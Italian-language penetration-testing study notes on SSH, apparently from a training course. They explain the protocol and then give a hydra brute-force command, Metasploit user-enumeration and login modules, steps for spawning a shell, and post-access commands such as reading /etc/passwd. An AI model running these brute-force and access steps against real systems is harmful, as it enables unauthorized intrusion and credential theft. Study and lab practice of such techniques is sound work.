- SSH (Secure Shell) è un protocollo di amministrazione remota che offre la crittografia ed è il successore di
Telnet.
- In genere viene utilizzato per l'accesso remoto a server e sistemi.
- SSH utilizza la porta TCP 22 per impostazione predefinita, ma, come altri servizi, può essere
configurato per utilizzare qualsiasi altra porta TCP aperta.
- L'autenticazione SSH può essere configurata in due modi:
    - Autenticazione con nome utente e password
    - Autenticazione basata su chiavi
- Nel caso dell'autenticazione con nome utente e password, possiamo eseguire un attacco di forza bruta
sul server SSH per identificare le credenziali legittime e quindi ottenere l'accesso al sistema di
destinazione.

### exploit

- **hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP_TARGET -t 4 ssh**
    - **-t 4** thread che impostiamo in quanto può causare un crash del sistema

CON METASPLOIT

1. **auxiliary/scanner/ssh/ssh_enumusers** trova utenti
    1. **USER_FILE**  /usr/share/metasploit-framework/data/wordlists/common_users.txt
2. **auxiliary/scanner/ssh/ssh_login** modulo per bruteforce
    1. **PASS_FILE** /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt **oppure** /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
    2. **USER_FILE**  /usr/share/metasploit-framework/data/wordlists/common_users.txt
    3. **sessions** per vedere se abbiamo una sessione interattiva con una shell
    4. **sessions NUMERO_SESSIONE** per accedere alla sessione con una shell
    5. **/bin/bash -i** crea una shell interattiva  (non sempre funge)
- **ssh USERNAME@IP_TARGET** per accedere al protocollo SSH

ALCUNI COMANDI

- **whoami**
- **groups USERNAME**
- **cat /etc/*issue**  versione distribuzione
- **uname -r versione kernel**
- **cat /etc/passw**d mostra il contenuto del file che ha sala le passw
